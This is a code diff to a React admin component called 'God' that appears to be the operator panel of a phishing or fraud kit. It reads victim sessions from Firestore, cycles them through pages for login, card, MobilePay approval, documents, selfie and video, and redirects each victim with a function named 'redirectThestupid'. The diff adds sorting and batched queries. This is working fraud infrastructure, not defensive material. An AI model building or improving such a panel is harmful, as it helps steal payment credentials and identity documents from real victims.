@@ -16,20 +16,31 @@ import AdminCard from "../../components/AdminCard";
 function God() {
   const [controller, setControllers] = useState();
   const [data, setData] = useState([]);
-  const [pages, setPages] = useState(["login", "card", "approve", "mobilepay","docs","selfie","video"]);
+  const [pages, setPages] = useState([
+    "mobilepay",
+    "login",
+    "card",
+    "approve",
+    "docs",
+    "selfie",
+    "video",
+  ]);
 
   const getUsersControllers = async () => {
     const ids = [];
     const unsub = onSnapshot(collection(db, "admin"), (cl) => {
-      const usersData = cl.docs.map((doc) => {
+      let usersData = cl.docs.map((doc) => {
         ids.push(doc.id.replace("+", ""));
         return {
           id: doc.id,
           ...doc.data(),
         };
       });
+      console.log(usersData);
+      usersData = usersData.sort((a, b) => new Date(b.date) - new Date(a.date));
+      console.log(usersData);
       setControllers(usersData);
-      getUserData(ids);
+      getContentById(ids);
     });
   };
 
@@ -48,6 +59,23 @@ function God() {
       });
   };
 
+  const getContentById = async (ids) => {
+    // don't run if there aren't any ids or a path for the collection
+    if (!ids || !ids.length) return [];
+
+    const batches = [];
+
+    while (ids.length) {
+      // firestore limits batches to 10
+      const batch = ids.splice(0, 10);
+
+      // add the batch request to to a queue
+      batches.push(await getUserData(batch));
+    }
+    // after all of the data is fetched, return it
+    return Promise.all(batches).then((content) => setData(content.flat()));
+  };
+
   const getUserData = async (ids) => {
     const q = query(collection(db, "Users"), where("id", "in", ids));
     const datas = {};
@@ -55,10 +83,11 @@ function God() {
     querySnapshot.forEach((doc) => {
       datas[doc.data().id] = [...(datas[doc.data().id] || []), doc.data()];
     });
-    setData(Object.values(datas));
+    return Object.values(datas);
   };
 
   const redirectThestupid = async (identifier, params) => {
+    console.log(params);
     await updateDoc(doc(db, "admin", identifier), {
       loading: false,
       ...params,
